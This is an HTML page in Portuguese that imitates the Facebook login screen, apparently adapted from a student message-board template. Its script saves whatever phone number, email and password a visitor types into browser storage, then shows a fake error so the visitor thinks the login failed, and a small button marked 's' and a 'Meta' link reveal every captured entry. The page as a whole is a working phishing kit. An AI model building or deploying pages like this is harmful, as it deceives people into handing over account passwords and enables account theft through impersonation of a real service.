<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
      margin: 0;
      background-color: #fff;
      padding-top: 50px;
    }

    .logo {
      color: #1877f2;
      font-size: 60px;
      font-weight: bold;
      margin-bottom: 10px;
    }

    h1 {
      font-size: 22px;
      color: #000;
      margin-bottom: 30px;
      font-weight: normal;
    }

    .form-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 90%;
      max-width: 400px;
    }

    input[type="text"], textarea {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ddd;
      border-radius: 10px;
      font-size: 16px;
      box-sizing: border-box;
    }

    textarea {
      resize: none;
      height: 80px;
    }

    button {
      width: 100%;
      background-color: #1877f2;
      color: white;
      border: none;
      padding: 14px;
      font-size: 18px;
      border-radius: 30px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #0d65d9;
    }

    .help {
      margin-top: 10px;
      color: #000;
      font-size: 14px;
    }

    .messages-section {
      margin-top: 50px;
      text-align: center;
    }

    .view-btn {
      border: 1px solid #ddd;
      border-radius: 30px;
      padding: 10px 25px;
      font-size: 16px;
      background-color: white;
      cursor: pointer; ;
    }

    .view-btn:hover {
      background-color: #ccc;
    }

    .today {
      margin-top: 10px;
      font-size: 14px;
      color: #000;
      cursor: pointer;
    }

    .message-list {
      width: 90%;
      max-width: 400px;
      margin-top: 30px;
      text-align: left;
      display: none;
      border-top: 1px solid #ccc;
      padding-top: 15px;
    }

    .message-item {
      background: #ffffff;
      border-radius: 10px;
      padding: 10px;
      margin-bottom: 10px;
    }

    .student-name {
      font-weight: bold;
      color: #1877f2;
    }

    .student-text {
      margin-top: 5px;
      color: #000;
    }
  </style>
</head>
<body>
  <div class="logo">f</div>
  <h1>Facebook</h1>

  <div class="form-container">
    <input type="text" id="studentName" placeholder="Numero do celular ou email">
    <textarea id="studentMessage" placeholder="senha"></textarea>
    <button id="sendBtn">Entrar</button>
    <div class="help">Esqueceu a senha?</div>
  </div>

  <div class="messages-section">
    <button class="view-btn" id="viewMessagesBtn">s</button>
    <div class="today" id="todayLink">Meta</div>
  </div>

  <div class="message-list" id="messageList"></div>

  <script>
    // Carregar mensagens existentes do localStorage
    function loadMessages() {
      return JSON.parse(localStorage.getItem('mensagens')) || [];
    }

    // Salvar mensagens no localStorage
    function saveMessages(messages) {
      localStorage.setItem('mensagens', JSON.stringify(messages));
    }

    // Atualizar a lista de mensagens na tela
    function displayMessages() {
      const messageList = document.getElementById('messageList');
      const messages = loadMessages();

      if (messages.length === 0) {
        messageList.innerHTML = "<p>Nenhuma mensagem enviada hoje.</p>";
      } else {
        messageList.innerHTML = messages
          .map(msg => `
            <div class="message-item">
              <div class="student-name">${msg.nome}</div>
              <div class="student-text">${msg.texto}</div>
            </div>
          `).join('');
      }

      messageList.style.display = 'block';
    }

    // Enviar nova mensagem
    document.getElementById('sendBtn').addEventListener('click', () => {
      const nome = document.getElementById('studentName').value.trim();
      const texto = document.getElementById('studentMessage').value.trim();

      if (nome === '' || texto === '') {
        alert('Por favor, preencha o numero e a senha.');
        return;
      }

      const messages = loadMessages();
      messages.push({ nome, texto });
      saveMessages(messages);

      document.getElementById('studentName').value = '';
      document.getElementById('studentMessage').value = '';

      alert('Erro! tente novamente mais tarde');
    });

    // Exibir mensagens ao clicar nos botões
    document.getElementById('viewMessagesBtn').addEventListener('click', displayMessages);
    document.getElementById('todayLink').addEventListener('click', displayMessages);
  </script>
</body>
</html>
